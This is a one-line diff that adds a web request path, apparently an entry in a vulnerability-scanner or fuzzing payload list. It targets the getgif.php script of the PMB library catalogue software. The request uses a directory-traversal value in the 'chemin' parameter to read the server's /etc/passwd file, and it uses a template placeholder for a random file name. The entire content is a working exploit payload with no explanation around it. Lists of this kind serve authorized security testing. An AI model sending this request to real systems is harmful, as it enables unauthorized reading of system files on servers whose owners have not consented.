@@ -1,0 +1,1 @@
+/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif={{rand_base(4)}}
